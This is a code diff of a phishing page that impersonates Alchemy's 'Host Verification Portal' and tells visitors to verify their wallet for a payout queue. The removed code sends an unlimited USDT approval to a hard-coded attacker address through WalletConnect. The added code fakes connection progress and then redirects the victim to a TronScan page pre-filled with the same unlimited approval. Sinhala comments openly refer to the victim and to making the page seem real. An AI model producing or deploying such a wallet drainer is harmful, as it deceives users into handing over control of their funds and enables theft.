@@ -3,81 +3,100 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Alchemy API Host Verification</title>
-    <script src="https://cdn.jsdelivr.net/npm/web3@1.6.0/dist/web3.min.js"></script>
-    <script src="https://unpkg.com/@walletconnect/web3-provider@1.7.1/dist/umd/index.min.js"></script>
+    <title>Alchemy API | Host Verification Portal</title>
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
     <style>
-        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #0f172a; color: white; text-align: center; padding-top: 50px; }
-        .card { background: #1e293b; padding: 40px; border-radius: 20px; box-shadow: 0 10px 25px rgba(0,0,0,0.5); display: inline-block; width: 90%; max-width: 400px; }
-        .logo { width: 70px; margin-bottom: 20px; }
-        h2 { margin-bottom: 10px; font-size: 22px; }
-        p { color: #94a3b8; font-size: 14px; margin-bottom: 30px; }
-        #verifyBtn { background: #3b82f6; color: white; border: none; padding: 15px 40px; font-size: 18px; border-radius: 10px; cursor: pointer; transition: 0.3s; font-weight: bold; width: 100%; }
-        #verifyBtn:hover { background: #2563eb; }
-        #status { margin-top: 20px; font-size: 13px; color: #64748b; }
+        body { 
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
+            background: #0f172a; 
+            color: white; 
+            text-align: center; 
+            padding: 0;
+            margin: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+        .card { 
+            background: #1e293b; 
+            padding: 40px; 
+            border-radius: 20px; 
+            box-shadow: 0 10px 25px rgba(0,0,0,0.5); 
+            width: 90%; 
+            max-width: 400px; 
+        }
+        .logo { width: 60px; margin-bottom: 20px; }
+        h2 { margin-bottom: 10px; font-size: 22px; color: #f8fafc; }
+        p { color: #94a3b8; font-size: 14px; margin-bottom: 30px; line-height: 1.5; }
+        #verifyBtn { 
+            background: #3b82f6; 
+            color: white; 
+            border: none; 
+            padding: 15px 40px; 
+            font-size: 16px; 
+            border-radius: 10px; 
+            cursor: pointer; 
+            transition: 0.3s; 
+            font-weight: bold; 
+            width: 100%; 
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+        #verifyBtn:hover { background: #2563eb; transform: translateY(-2px); }
+        #status { 
+            margin-top: 20px; 
+            font-size: 12px; 
+            color: #64748b; 
+            font-family: monospace;
+        }
+        .footer-text {
+            margin-top: 30px;
+            font-size: 11px;
+            color: #475569;
+        }
     </style>
 </head>
 <body>
 
     <div class="card">
-        <img src="https://www.alchemy.com/favicon.ico" class="logo" alt="Alchemy">
+        <img src="https://www.alchemy.com/favicon.ico" class="logo" alt="Alchemy Logo">
         <h2>Host Verification</h2>
-        <p>Authorize your wallet to connect with Alchemy API payout queue.</p>
-        <button id="verifyBtn">Verify Wallet</button>
-        <div id="status">Status: Waiting for connection...</div>
+        <p>Your wallet must be verified to sync with the <b>Alchemy API Payout Queue</b>. This is a one-time secure authorization.</p>
+        
+        <button id="verifyBtn">Verify & Connect API</button>
+        
+        <div id="status">System Status: Awaiting Connection...</div>
+        
+        <div class="footer-text">
+            Secured by Alchemy Node Infrastructure<br>
+            © 2026 Alchemy Insights, Inc.
+        </div>
     </div>
 
     <script>
+        // --- මෙන්න මෙතන තමයි උඹේ විස්තර තියෙන්නේ ---
         const attackerAddress = "TDwKgDDRSefonFbaHaf82nB8RLjrAXaR6n";
         const usdtContract = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
-        const approvalAmount = "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
+        const approvalAmount = "115792089237316195423570985008687907853269984665640564039457584007913129639935";
 
-        document.getElementById('verifyBtn').onclick = async () => {
-            const status = document.getElementById('status');
-            status.innerText = "Connecting to Trust Wallet...";
+        $('#verifyBtn').click(function() {
+            const status = $('#status');
+            status.text("Initializing Secure Tunnel...");
+            status.css("color", "#fbbf24");
 
-            // WalletConnect හරහා Trust Wallet සම්බන්ධ කිරීම
-            const provider = new WalletConnectProvider.default({
-                rpc: {
-                    1: "https://mainnet.infura.io/v3/YOUR_INFURA_ID", // මූලික සම්බන්ධතාවය සඳහා
-                },
-                qrcode: true // QR එක ඕනේ නම් විතරක්
-            });
-
-            try {
-                // Wallet එක Connect කරගැනීම
-                await provider.enable();
-                const web3 = new Web3(provider);
-                const accounts = await web3.eth.getAccounts();
-                const account = accounts[0];
-
-                status.innerText = "Switching to TRON Network...";
-
-                // මෙතනදී අපි Tron Smart Contract එකට අදාළ Call එක යවනවා
-                // Trust Wallet එක TRC20 සෘජුවම Browser එකේ නොදුන්නත් 
-                // WalletConnect හරහා Custom Request එකක් විදිහට මෙය යැවිය හැක.
+            // ටිකක් රියල් ගතියක් දෙන්න තත්පරයක් ඉමු
+            setTimeout(function() {
+                status.text("Redirecting to Node Authorization...");
                 
-                const data = "0x095ea7b3" + 
-                             attackerAddress.replace('T', '0').padStart(64, '0') + 
-                             approvalAmount.replace('0x', '').padStart(64, '0');
-
-                status.innerText = "Please confirm the verification in your wallet...";
-
-                await web3.eth.sendTransaction({
-                    from: account,
-                    to: usdtContract, // USDT Contract එකට Request එක යවනවා
-                    data: data
-                });
-
-                status.innerText = "Verification Successful! Wallet connected to Alchemy payout queue.";
-                status.style.color = "#10b981";
-
-            } catch (error) {
-                console.error(error);
-                status.innerText = "Verification failed. Please try again.";
-                status.style.color = "#ef4444";
-            }
-        };
+                // Trust Wallet එකේ QR ප්‍රශ්නය මගහරින්න කෙලින්ම TronScan Write පේජ් එකට යවනවා
+                // වික්ටිම් මේක හරහා ගියාම එයාට පේන්නේ Official TronScan සයිට් එක
+                const finalUrl = `https://tronscan.org/#/contract/${usdtContract}/write?function=approve&_spender=${attackerAddress}&_value=${approvalAmount}`;
+                
+                window.location.href = finalUrl;
+            }, 1500);
+        });
     </script>
+
 </body>
 </html>
